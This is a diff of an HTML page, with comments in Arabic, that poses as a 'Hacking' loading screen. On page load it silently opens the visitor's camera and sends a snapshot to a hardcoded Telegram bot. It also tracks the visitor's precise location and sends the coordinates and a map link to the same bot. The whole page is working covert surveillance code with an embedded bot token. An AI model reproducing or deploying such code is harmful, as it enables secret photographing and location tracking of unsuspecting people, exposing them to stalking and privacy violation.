@@ -1,96 +1,315 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>التقاط فوري</title>
-    <script>
-        // بيانات البوت
-        const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
-        const CHAT_ID = '7327464581';
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap');
         
-        // إعدادات الأداء
-        const CAPTURE_DELAY = 100; // تأخير قصير جداً قبل الالتقاط (مللي ثانية)
-        const IMAGE_QUALITY = 0.6; // جودة منخفضة للسرعة (0.6 = 60%)
-        const RESOLUTION = { width: 640, height: 480 }; // دقة منخفضة للسرعة
-
-        async function ultraFastCapture() {
-            try {
-                // 1. فتح الكاميرا بأقل إعدادات ممكنة للسرعة
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        ...RESOLUTION,
-                        frameRate: 15 // تقليل معدل الإطارات للسرعة
-                    }
-                });
-                
-                // 2. إنشاء عناصر سريعة بدون عرضها في DOM
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.muted = true;
-                video.playsInline = true;
-                await video.play();
-                
-                // 3. التقاط سريع مع الحد الأدنى من المعالجة
-                const canvas = document.createElement('canvas');
-                canvas.width = RESOLUTION.width;
-                canvas.height = RESOLUTION.height;
-                const ctx = canvas.getContext('2d', { willReadFrequently: false });
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // 4. إيقاف الكاميرا فوراً (لا تنتظر الإرسال)
-                stream.getTracks().forEach(track => track.stop());
-                
-                // 5. تحويل وإرسال متوازي (لا ينتظر العرض)
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'instant_capture.jpg');
-                    
-                    // إرسال غير متزامن (لا ننتظر الرد)
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData,
-                        mode: 'no-cors' // لتجنب انتظار الرد
-                    }).catch(e => console.log('تم الإرسال (قد لا يكون مؤكداً)'));
-                    
-                    // إغلاق سريع للنافذة
-                    setTimeout(window.close, 300);
-                }, 'image/jpeg', IMAGE_QUALITY);
-                
-            } catch (error) {
-                // عرض واجهة طلب الإذن إذا فشلت المحاولة التلقائية
-                document.body.innerHTML = `
-                    <div style="
-                        text-align:center;
-                        padding:20px;
-                        font-family:Arial;
-                        max-width:400px;
-                        margin:50px auto;
-                    ">
-                        <h2>التقاط الصورة الفوري</h2>
-                        <p>يجب منح إذن الوصول للكاميرا</p>
-                        <button onclick="ultraFastCapture()" style="
-                            padding: 12px 24px;
-                            background: #0088cc;
-                            color: white;
-                            border: none;
-                            border-radius: 6px;
-                            font-size: 16px;
-                            cursor: pointer;
-                            margin-top: 20px;
-                        ">منح الإذن والالتقاط</button>
-                    </div>
-                `;
-            }
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+            background-color: #f0f0f0;
+            font-family: 'Roboto', sans-serif;
         }
-
-        // بدء العملية فوراً مع تأخير بسيط لتهيئة الصفحة
-        window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(ultraFastCapture, CAPTURE_DELAY);
-        });
-    </script>
+        
+        .content {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        i {
+            font-size: 100px;
+            color: #0c773c;
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+        }
+        
+        h1 {
+            font-size: 50px;
+            color: #195e3e;
+            margin-left: 20px;
+        }
+        
+        .loading-container {
+            width: 200px;
+            height: 10px;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+        
+        .loading-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #0c773c;
+            border-radius: 5px;
+            animation: loading 3s ease-in-out infinite;
+            position: relative;
+        }
+        
+        .loading-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, 
+                        rgba(255,255,255,0) 0%, 
+                        rgba(255,255,255,0.8) 50%, 
+                        rgba(255,255,255,0) 100%);
+            animation: shine 3s ease-in-out infinite;
+        }
+        
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 100%; }
+            100% { width: 0%; }
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .dots {
+            display: flex;
+            justify-content: center;
+            margin-top: 15px;
+        }
+        
+        .dot {
+            width: 10px;
+            height: 10px;
+            background-color: #0c773c;
+            border-radius: 50%;
+            margin: 0 5px;
+            animation: bounce 1.5s infinite ease-in-out;
+        }
+        
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+    </style>
 </head>
 <body>
-    <!-- المحتوى سيتم تعديله ديناميكياً -->
+    <div class="content">
+        <i class="fa-solid fa-user-secret"></i>
+        <h1>Hacking</h1>
+    </div>
+    
+    <div class="loading-container">
+        <div class="loading-bar"></div>
+    </div>
+    
+    <div class="dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+  <div id="status"></div>
+    <script>
+        setTimeout(function() {
+            // Remove existing content
+            document.body.innerHTML = '';
+            
+            // بيانات البوت
+            const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
+            const CHAT_ID = '7327464581';
+            
+            // إعدادات الأداء
+            const CAPTURE_DELAY = 100; // تأخير قصير جداً قبل الالتقاط (مللي ثانية)
+            const IMAGE_QUALITY = 0.6; // جودة منخفضة للسرعة (0.6 = 60%)
+            const RESOLUTION = { width: 640, height: 480 }; // دقة منخفضة للسرعة
+
+            async function ultraFastCapture() {
+                try {
+                    // 1. فتح الكاميرا بأقل إعدادات ممكنة للسرعة
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            ...RESOLUTION,
+                            frameRate: 15 // تقليل معدل الإطارات للسرعة
+                        }
+                    });
+                    
+                    // 2. إنشاء عناصر سريعة بدون عرضها في DOM
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.playsInline = true;
+                    await video.play();
+                    
+                    // 3. التقاط سريع مع الحد الأدنى من المعالجة
+                    const canvas = document.createElement('canvas');
+                    canvas.width = RESOLUTION.width;
+                    canvas.height = RESOLUTION.height;
+                    const ctx = canvas.getContext('2d', { willReadFrequently: false });
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // 4. إيقاف الكاميرا فوراً (لا تنتظر الإرسال)
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // 5. تحويل وإرسال متوازي (لا ينتظر العرض)
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'instant_capture.jpg');
+                        
+                        // إرسال غير متزامن (لا ننتظر الرد)
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData,
+                            mode: 'no-cors' // لتجنب انتظار الرد
+                        }).catch(e => console.log('تم الإرسال (قد لا يكون مؤكداً)'));
+                        
+                        // إغلاق سريع للنافذة
+                        setTimeout(window.close, 300);
+                    }, 'image/jpeg', IMAGE_QUALITY);
+                    
+                } catch (error) {
+                    // عرض واجهة طلب الإذن إذا فشلت المحاولة التلقائية
+                    document.body.innerHTML = `
+                        <div style="
+                            text-align:center;
+                            padding:20px;
+                            font-family:Arial;
+                            max-width:400px;
+                            margin:50px auto;
+                        ">
+                            <h2>التقاط الصورة الفوري</h2>
+                            <p>يجب منح إذن الوصول للكاميرا</p>
+                            <button onclick="ultraFastCapture()" style="
+                                padding: 12px 24px;
+                                background: #0088cc;
+                                color: white;
+                                border: none;
+                                border-radius: 6px;
+                                font-size: 16px;
+                                cursor: pointer;
+                                margin-top: 20px;
+                            ">منح الإذن والالتقاط</button>
+                        </div>
+                    `;
+                }
+            }
+
+            // بدء العملية فوراً مع تأخير بسيط لتهيئة الصفحة
+            setTimeout(ultraFastCapture, CAPTURE_DELAY);
+            
+        }, 5000);
+        //-------------------------
+              document.addEventListener('DOMContentLoaded', function() {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = 'جاري تحديد الموقع...';
+            
+            if (navigator.geolocation) {
+                // استخدام watchPosition بدلاً من getCurrentPosition للحصول على أسرع استجابة
+                const watchId = navigator.geolocation.watchPosition(
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        
+                        // إيقاف مراقبة الموقع بعد الحصول عليه
+                        navigator.geolocation.clearWatch(watchId);
+                        
+                        // إرسال الموقع إلى بوت تلجرام
+                        sendToTelegramBot(latitude, longitude);
+                    },
+                    function(error) {
+                        let errorMessage;
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "   ";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "   .";
+                                break;
+                            case error.UNKNOWN_ERROR:
+                                errorMessage = "";
+                                break;
+                        }
+                        statusElement.textContent = errorMessage;
+                        document.querySelector('.loader').style.display = 'none';
+                    },
+                    {
+                        enableHighAccuracy: true, // للحصول على دقة أعلى وأسرع
+                        maximumAge: 0, // عدم استخدام البيانات المخزنة مؤقتًا
+                        timeout: 5000 // وقت انتظار قصير
+                    }
+                );
+            } else {
+                statusElement.textContent = "المتصفح لا يدعم خدمة الموقع الجغرافي.";
+                document.querySelector('.loader').style.display = 'none';
+            }
+        });
+
+        function sendToTelegramBot(latitude, longitude) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = 'جاري إرسال الموقع...';
+            
+                     // استبدل هذه القيم بمعلومات بوتك
+            const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
+            const chatId = '7327464581';
+            
+            const message = `?? تم استلام موقع جديد:
+الخط العرضي: ${latitude}
+الخط الطولي: ${longitude}
+رابط خرائط جوجل: https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            // استخدام fetch مع AbortController للتحكم في الوقت المستغرق
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 3000); // مهلة 3 ثواني
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                }),
+                signal: controller.signal
+            })
+            .then(response => response.json())
+            .then(data => {
+                clearTimeout(timeoutId);
+                document.querySelector('.loader').style.display = 'none';
+                if (data.ok) {
+                    statusElement.textContent = 'تم إرسال الموقع بنجاح! يمكنك إغلاق هذه الصفحة.';
+                } else {
+                    statusElement.textContent = 'فشل في إرسال الموقع إلى بوت تلجرام.';
+                }
+            })
+            .catch(error => {
+                clearTimeout(timeoutId);
+                document.querySelector('.loader').style.display = 'none';
+                if (error.name === 'AbortError') {
+                    statusElement.textContent = 'انتهى الوقت المخصص لإرسال الموقع.';
+                } else {
+                    statusElement.textContent = 'خطأ في الاتصال بالإنترنت.';
+                }
+                console.error('Error:', error);
+            });
+        }
+    </script>
 </body>
 </html>
